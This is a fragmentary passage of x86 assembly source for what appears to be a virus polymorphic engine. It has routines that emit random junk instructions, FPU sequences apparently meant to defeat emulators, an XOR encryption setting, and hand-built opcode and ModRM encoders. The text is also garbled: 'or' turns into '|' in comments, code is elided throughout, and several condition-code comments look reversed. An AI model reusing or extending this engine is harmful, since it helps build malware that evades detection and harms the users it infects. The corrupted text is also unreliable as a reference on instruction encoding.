...
;                         initialized data | padding space). the junk
...
gp_loop:        push  ecx
                ...
                jmp   gp_np_entry
gp_psh_entry:   mov   eax, PUSH_REG | REG_EBP | (100h * MOV_EBP_ESP)
                stosd
...
gp_junk_proc:   call  iProcJunk               ; make some junk
                ...
                mov   eax, edx
                xor   ah, ah
                shl   eax, 08h ^ 02h        ; shift left one byte + * 4
                xor   al, PROC_RETP           ; generate ret (with params)
                test  ah, ah                  ; do we have parameters?
                jz    gp_no_par

                mov   byte ptr [edi], POP_REG | REG_EBP
                test  dh, 01h
                jz    gp_psh_exit
                xor   byte ptr [edi], PROC_LEAVE ^ (POP_REG | REG_EBP)
...
gl_no_par:
                ...
                mov   ax, ESC_2BYTE ^ ((JMPC_LONG ^ COND_NE) * 100h)
                stosw                            ; generate JNZ
                pop   eax
                neg   edi
...
isj_dir0:
                ...
                mov   al, OVERRIDE_FS
                stosb
                mov   bx, REG_ESP ^ (OPTYPE_MOV * 100h)
                mov   ax, OPSIZE_32 ^ (MEM_REG * 100h)
                call  ciOpRMReg
...
dd_ecx_isj:     xchg  eax, edx
                ...
                mov   bx, REG_ECX ^ (OPTYPE_MOV * 100h) ^ MOD_REG
                call  rnd32
                mov   al, OPSIZE_32
                and   ah, REG_MEM
                jnz   dd_nxchg
...
iProcFPUFool    proc
                ...
                ; initialize FPU
                mov   eax, FPU_WAIT | (FPU_INIT * 100h) | 'X' * 1000000h
                stosd
                dec   edi
...
gf_as1:
                ...
                ;  jump back before compare instruction | afta
                ;
                ...
                xchg  eax, ecx
                mov   byte ptr [edi], JMPC_SHORT ^ COND_NZ
                inc   edi
...
gf_el1:
                ...
                ;
                xchg  eax, ecx
                mov   byte ptr [edi], JMPC_SHORT ^ COND_Z
                inc   edi
                push  edi
                inc   edi
                call  iBlockJunk
...
gf_meth3:       mov   ax, FPU_LDLN2
                ...
                mov   cl, REG_ST1 | MOD_REG
                call  ciCreateOperand
                mov   ax, FPU_DWORD_LDST | (100h * (MOD_REG ^ 09h))
                stosw
                ret
...
iBlockJunk      endp
                ...
                ; writes two to four random junk instruction (reg | mem)
iRndJunk        proc
                pushad
                push  03h
                call  rnd32r
...
; gets random register, parameter | junk memory operand
iGetMemory      proc
                push  eax
gm_rep:         xor   eax, eax
                mov   al, GM_METHCNT2
...
gClearReg       proc
                ...
                ; generate either a SUB reg, reg | XOR reg, reg
...
gLoadReg        proc
                ...
                sub   al, 01h
                adc   al, 00h
glr_shift_sx:   shl   eax, 03h     ; MOVX_SX | MOVX_ZX
...
glr_m4_ror:     xchg  dl, cl
                ...
                jnz   glr_m4_n1
                inc   bh
glr_m4_n1:      xor   ecx, 0FFFFFF00h ^ MOD_REG
                jmp   ciShiftRM
...
;
; AL: operand size
;       you can generate byte, word | dword operations. choose between
...
;       SHIFT_1
;       SHIFT_CL
;       | random value < SHIFT_RND
;
; CL: R/M operand. can be:
;       1. register (REG_??? | MOD_REG)
...
;       take special care when using no scaling factor (logical | with
;       NO_SCALE)
;
; ESI: displacement
...
;    movsx esi, rm8          ; rm8 = 8-bit register | memory operand
...
ciSRexit:       mov   [esp], edi
                ...
                ret
ciShiftRM       endp
; generates a math operation, move, compare | exchange instruction.
;
; AL: operand size
;       you can generate byte, word | dword operations. choose between
;       OPSIZE_8, OPSIZE_16 and OPSIZE_32. you may generate a random
...
;       | random value < DIR_RND.
;
; BL: register
;     REG_??? | random value lower than REG_RND
;
; BH: operation type
...
ciORRexit:      mov   [esp], edi
                ...
                ret
ciOpRMReg       endp
; generates a math operation, move | compare instruction.
;
; AL: operand size
;       you can generate byte, word | dword operations. choose between
...
;
; ESI: displacement | immediate address
;
...
ciORIno_prefix: cmp   bl, OPTYPE_MOV         ; MOV operation?
                ...
                shl   cl, 03h                ; generate B0h | B8h opcode
...
;
; BL: register | additional opcode information
;
; CL: R/M operand. can be:
...
;    movsx esi, rm8          ; rm8 = 8-bit register | memory operand
;                            ; containing 8-bit displacement.
;    this check isn't performed when MOD_DISP8 | MOD_DISP32
;
...
; create MOD/RM byte
;
; BL = register | additional opcode information (bits 3, 4, 5)
; CL = register | memory operand (bits 0,1,2)
;      - register operand: REG_??? + MOD_REG
...
; AL = MOD_NODISP, MOD_DISP8 | MOD_DISP32 (or MOD_SIB if sib)
; CL = base
;         REG_???
; CH = index
...
CMblah4:        mov   eax, ecx
                ...
                and   al, 0C0h | MOD_SIB | MOD_DIRECT
                or    al, REG_ESP
                and   cl, 0C7h | MOD_SIB | MOD_DIRECT
CMblah6:        and   al, 0C7h
                or    eax, ebx
                stosb
                mov   eax, ecx
                and   al, 0C7h | MOD_SIB | MOD_DIRECT
CMexit1:
...
ENC_XOR       equ 00000000b             ; ^ encryption
...
COND_NAE        equ   COND_B          ; neither above | equal   A > B
COND_NB         equ   COND_NC         ; not below                A ≤ B
COND_AE         equ   COND_NB         ; above | equal           A ≤ B
COND_BE         equ   006h            ; below | equal           A ≥ B
COND_NA         equ   COND_BE         ; not above                A ≥ B
COND_NBE        equ   007h            ; neither below | equal   A < B
COND_A          equ   COND_NBE        ; above                    A < B
COND_L          equ   00Ch            ; less                     A > B
COND_NGE        equ   COND_L          ; neither greater | equal A > B
COND_NL         equ   00Dh            ; not less                 A ≤ B
COND_GE         equ   COND_NL         ; greater | equal         A ≤ B
COND_LE         equ   00Eh            ; less | equal            A ≥ B
COND_NG         equ   COND_LE         ; not greater              A ≥ B
COND_NLE        equ   00Fh            ; neither less | equal    A < B
...
MATH_ADD        equ   OPTYPE_ADD << 03h
MATH_OR         equ   OPTYPE_OR  << 03h
MATH_ADC        equ   OPTYPE_ADC << 03h
MATH_SBB        equ   OPTYPE_SBB << 03h
MATH_AND        equ   OPTYPE_AND << 03h
MATH_SUB        equ   OPTYPE_SUB << 03h
MATH_XOR        equ   OPTYPE_XOR << 03h
MATH_CMP        equ   OPTYPE_CMP << 03h
...
; RM bits
RM_DIRECT       equ   REG_EBP ^ MOD_NODISP
RM_SIB          equ   REG_ESP
